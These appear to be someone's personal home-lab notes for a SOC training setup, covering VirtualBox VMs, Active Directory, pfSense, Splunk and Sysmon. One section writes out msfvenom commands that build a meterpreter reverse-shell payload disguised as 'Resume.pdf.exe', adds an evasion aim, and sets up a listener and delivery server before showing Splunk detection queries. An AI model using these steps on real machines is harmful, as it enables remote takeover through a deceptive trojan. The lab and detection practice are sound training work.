Download Virtual Box
Download Linux, Metasploitable2, Windows 11, and Windows 2022 Server
Create a lab folder in C drive
Import/Add all four into Hypervisor
Remake to appropriate names (Kali Linux, Win11, Metasploitable 2, DC1 (Server))
Connect all to same switch
Settings -> Network -> Bridged Adapter -> reltek
Kali - 192.168.1.176 /24
Mask - 255.255.255.0
Win11 - 192.168.1.11
Default Gateway - 192.168.1.1
DC1 - 192.168.1.22				DNS: 8.8.8.8				Login - Administrator/Red!
Metasploitable 2 - 192.168.1.179								Login - msfadmin
Ping each machine to see they are connected
Windows 11 is default PING off, can enable PING or disable firewall
Changed IP of Win11 and DC1 to 192.168.1.11 and 192.168.1.22
DNS of Win11 is IP of DC1
Pinged work from both
DC1 -> Manage -> add roles and features -> Active Directory Domain Services + DNS Server -> add -> next
Promote this server to Domain Controller
Add new forest because we are creating this system from scratch
Tools -> Active Directory users and Computers
Forest -> Users -> Right click new -> User -> name etc
MCSA Cert to learn about active directory, etc
Connect Win11 to Server -> Right click windows icon -> system -> Advanced system settings for System properties
Computer Name -> Change -> member of -> Domain
Input Domain -> Login as Administrator
To make a sandbox network (can only communicate with systems that are in the network)
Ctrl + h -> create -> configure -> enable DHCP Server -> set the networks of machines to that virtual adapter (NO INTERNET)
Nat Network -> Hypervisor is the router -> preferences -> network -> plus -> Select and third icon -> network Name -> support DHCP -> configure network -> OK -> set the rest to NAT (INTERNET SUPPORTED)
Internal Network -> VM's connected but not to host (good for malware analysis but no internet) create internet network and statically set IPs on machines, not attached (no attachment, good for malware analysis), NAT (VM's own networks), NAT network (HV is router/host)
SPLUNK fundamental Course
Splunk -> S############1@gmail.com -> R$$$$$$$$!
Learn Sysmon
nmap -A 192.168.1.11 (Win11) -Pn
Download Firewall pfsense at pfsense.org/download/ -> AMD64 -> DVD ISO
VM - New -> Type BSD -> FreeBSD (64-Bit)
Disable USB
Run -> default -> reboot and shut down machine as soon as enter reboot -> settings of pfSense VM -> storage -> remove ISO
run again -> n -> em0 -> enter
192.168.1.181/24 pfSense WAN emo0
Go to browser on host, go to ip of pfsense, hit next till set dns to 8.8.8.8
configure WAN interface -> static -> ip address, subnet mask, gateway -> next
website going to hack -> defendtheweb.net
cmd -> nslookup -> defendtheweb.net to get address -> 3.10.42.19
Firewall -> Alias -> Add -> Name -> IP
Firewall -> Rules -> Block -> Protocol ANY -> Source Network 192.168.1.0/24 -> Destination Address or Alias DefendTheWebDOTnet
Reject -> block packet and reply			Block -> just block say nothing
Enable from all -> new -> any -> save
Main PC -> Control Center -> network and sharing -> Ethernet -> Ipv4 -> properties -> Static -> set IP of PC -> set subnet 255.255.255.0 -> Default gateway is Firewall IP (192.168.1.181) -> DNS server Firewall IP -> alternate 8.8.8.8
Set Clones or should really do new VMS -> settings -> internal network -> name network -> set both to that, make sure to select drop down and verify both are same
Win Clone -> 192.168.1.12				Kali Clone -> 192.168.1.13
Port 135/139/445 Open
msfvenom to make malware -> try to look into making it undetectable
windows/x64/meterpreter/reverse_tcp
msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=192.168.1.13 lport=4444 -f exe -o Resume.pdf.exe
msfconsole after it's made, use ls to check, after that do -> use exploit/multi/handler
type options to see what can be configured, -> set payload windows/x64/meterpreter/reverse_tcp
set lhost -> set lhost 192.168.1.13 (kali ip) -> type -> exploit, to run the malware
make new console -> python3 -m http.server 9999 (port not in use) -> this allows the windows machine to download the malware from kali
disable real time protection on windows vm -> to go kali ip and port of malware -> 192.168.1.13:9999 to download malware
run malware -> run cmd as admin -> netstat -anob
help -> shell -> net user -> net localgroup -> ipconfig in kali
Make sure splunk is configured -> program files-> splunk -> etc -> system -> local -> inputs.conf (copy from default, if no sysmon dl his)
services -> restart splunkd services -> create endpoint index by going to splunk -> localhost:8000 -> setting -> indexes -> new index -> endpoint
apps -> find more apps -> splunk add-on for sysmon -> app search -> index=endpoint 192.168.1.13 (kali ip) -> dest_port see if it does anything
index=endpoint Resume.pdf.exe -> EventCode 1 -> ParentImage -> process_id -> process_guid -> index=endpoint {process_guid} + shiftenter for new line -> | table _time,ParentImage,Image,CommandLine


NEW SECTION - https://app.letsdefend.io/training/lesson_detail/pfsense
Download pfsense - Make a new VM - Linux - Other(64x)
Installed pfsense iso
Remove iso file from settings and re-run
select 1 to set up interfaces
select n for vlan, set em0 for WAN, set em1 for LAN, set em2 for OPT1 - External (RED) em0- Internal (GREEN) em1- DMZ (ORANGE) em2
Select to set up IP address, Set em0 to dhc1, set manual IP for em1 192.168.1.75/24, set as None for last thing
Set n for http thing?
Install windows server - create vm without iso first, set network to Green (INTERNAL), set iso in the settings, install enterprise gui version, set advanced, next and install
Set password for Admin, log in, Go to network and sharing, adapter settings, ipv4 properties, set ip address, use the LAN ip (192.168.1.75) as the Default Gateway. Use 8.8.8.8 for DNS
System - Rename - Restart
Add roles and features -> Installation Type -> role-based installation -> next -> Server Roles -> Active Directory Domain Services -> Add features -> finish
Click flag -> Promote this server to a domain controller -> Add new active directory forest -> add new forest -> root name = soc.lab -> Domain controller Options -> set restore Password = Try109! -> check netBIOS domain name = SOC -> launch install and reboot
Download BadBlood -> can do from host and transfer over -> extract it -> launch powershell as admin -> cd .\Desktop\BadBlood\ -> ls -> .\Invoke-BadBlood.ps1 to install BadBlood
Download Windows10 iso -> New vm with no ISO -> network Green -> launch -> Add iso -> install&reboot select custom -> Select region/keyboard, Don't have internet -> limited setup -> name -> security -> set other minimal value (no location, no track, etc)
Set IP, default gateway as LAN IP, rename PC, reset, connect to domain in Advanced system settings, Computer Name, Change, set Domain to netbios domain name, login to domain Admin.
If can't connect to domain, set DNS server to domain IP
